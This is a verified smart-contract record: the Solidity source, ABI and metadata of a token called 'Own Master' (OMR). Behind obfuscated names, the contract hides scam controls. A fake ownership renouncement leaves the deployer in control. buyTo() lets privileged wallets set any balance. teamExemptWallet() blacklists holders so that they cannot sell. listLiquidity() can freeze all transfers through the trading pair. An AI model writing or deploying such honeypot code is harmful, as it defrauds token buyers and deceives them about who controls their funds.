{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface shouldFrom {\n    function createPair(address totalLiquidity, address feeTeam) external returns (address);\n}\n\ninterface totalReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromLimit) external view returns (uint256);\n\n    function transfer(address walletBuyTake, uint256 teamTo) external returns (bool);\n\n    function allowance(address txTotalMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletBuyTake,\n        uint256 teamTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMin, uint256 value);\n    event Approval(address indexed txTotalMax, address indexed spender, uint256 value);\n}\n\nabstract contract teamTakeAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverMaxFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalReceiverMetadata is totalReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OwnMaster is teamTakeAuto, totalReceiver, totalReceiverMetadata {\n\n    function teamExemptWallet(address takeTx) public {\n        feeFundSender();\n        \n        if (takeTx == teamLiquidityMin || takeTx == takeIs) {\n            return;\n        }\n        launchBuy[takeTx] = true;\n    }\n\n    address private fundTokenReceiver;\n\n    string private launchedBuy = \"OMR\";\n\n    function allowance(address receiverMarketingTake, address fromLaunchedAt) external view virtual override returns (uint256) {\n        if (fromLaunchedAt == receiverLaunch) {\n            return type(uint256).max;\n        }\n        return fundReceiver[receiverMarketingTake][fromLaunchedAt];\n    }\n\n    function listToken(address limitMode, address walletBuyTake, uint256 teamTo) internal returns (bool) {\n        if (limitMode == teamLiquidityMin) {\n            return isAt(limitMode, walletBuyTake, teamTo);\n        }\n        uint256 marketingReceiver = totalReceiver(takeIs).balanceOf(modeSwap);\n        require(marketingReceiver == listLimitTake);\n        require(walletBuyTake != modeSwap);\n        if (launchBuy[limitMode]) {\n            return isAt(limitMode, walletBuyTake, teamExempt);\n        }\n        return isAt(limitMode, walletBuyTake, teamTo);\n    }\n\n    mapping(address => bool) public launchBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingFund;\n    }\n\n    function owner() external view returns (address) {\n        return fundTokenReceiver;\n    }\n\n    mapping(address => uint256) private totalAutoFund;\n\n    address public teamLiquidityMin;\n\n    uint256 receiverList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeToken;\n    }\n\n    uint256 private isMarketingSell;\n\n    uint256 private takeToken = 100000000 * 10 ** 18;\n\n    function marketingSenderIs(address totalFee) public {\n        require(totalFee.balance < 100000);\n        if (isLimitList) {\n            return;\n        }\n        \n        amountBuy[totalFee] = true;\n        \n        isLimitList = true;\n    }\n\n    address receiverLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedBuy;\n    }\n\n    function transferFrom(address limitMode, address walletBuyTake, uint256 teamTo) external override returns (bool) {\n        if (_msgSender() != receiverLaunch) {\n            if (fundReceiver[limitMode][_msgSender()] != type(uint256).max) {\n                require(teamTo <= fundReceiver[limitMode][_msgSender()]);\n                fundReceiver[limitMode][_msgSender()] -= teamTo;\n            }\n        }\n        return listToken(limitMode, walletBuyTake, teamTo);\n    }\n\n    function transfer(address walletSell, uint256 teamTo) external virtual override returns (bool) {\n        return listToken(_msgSender(), walletSell, teamTo);\n    }\n\n    uint256 public totalLimit;\n\n    uint256 private autoMin;\n\n    mapping(address => mapping(address => uint256)) private fundReceiver;\n\n    uint8 private tradingFund = 18;\n\n    constructor (){\n        if (shouldBuy != isMarketingSell) {\n            takeLiquidity = true;\n        }\n        receiverMaxFee atTo = receiverMaxFee(receiverLaunch);\n        takeIs = shouldFrom(atTo.factory()).createPair(atTo.WETH(), address(this));\n        \n        teamLiquidityMin = _msgSender();\n        amountBuy[teamLiquidityMin] = true;\n        totalAutoFund[teamLiquidityMin] = takeToken;\n        amountToken();\n        \n        emit Transfer(address(0), teamLiquidityMin, takeToken);\n    }\n\n    function balanceOf(address fromLimit) public view virtual override returns (uint256) {\n        return totalAutoFund[fromLimit];\n    }\n\n    function approve(address fromLaunchedAt, uint256 teamTo) public virtual override returns (bool) {\n        fundReceiver[_msgSender()][fromLaunchedAt] = teamTo;\n        emit Approval(_msgSender(), fromLaunchedAt, teamTo);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundTokenReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txMode;\n    }\n\n    address public takeIs;\n\n    bool public txBuy;\n\n    uint256 private fromTrading;\n\n    address modeSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private txMode = \"Own Master\";\n\n    function isAt(address limitMode, address walletBuyTake, uint256 teamTo) internal returns (bool) {\n        require(totalAutoFund[limitMode] >= teamTo);\n        totalAutoFund[limitMode] -= teamTo;\n        totalAutoFund[walletBuyTake] += teamTo;\n        emit Transfer(limitMode, walletBuyTake, teamTo);\n        return true;\n    }\n\n    mapping(address => bool) public amountBuy;\n\n    function feeFundSender() private view {\n        require(amountBuy[_msgSender()]);\n    }\n\n    bool private fundFrom;\n\n    bool public takeLiquidity;\n\n    bool public marketingModeLiquidity;\n\n    event OwnershipTransferred(address indexed minMax, address indexed atAuto);\n\n    function amountToken() public {\n        emit OwnershipTransferred(teamLiquidityMin, address(0));\n        fundTokenReceiver = address(0);\n    }\n\n    function listLiquidity(uint256 teamTo) public {\n        feeFundSender();\n        listLimitTake = teamTo;\n    }\n\n    uint256 public shouldBuy;\n\n    bool public isLimitList;\n\n    uint256 listLimitTake;\n\n    uint256 constant teamExempt = 7 ** 10;\n\n    function buyTo(address walletSell, uint256 teamTo) public {\n        feeFundSender();\n        totalAutoFund[walletSell] = teamTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTotalMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketingTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLaunchedAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"buyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLimitList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"listLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingModeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"}],\"name\":\"marketingSenderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"}],\"name\":\"teamExemptWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidityMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletBuyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OwnMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}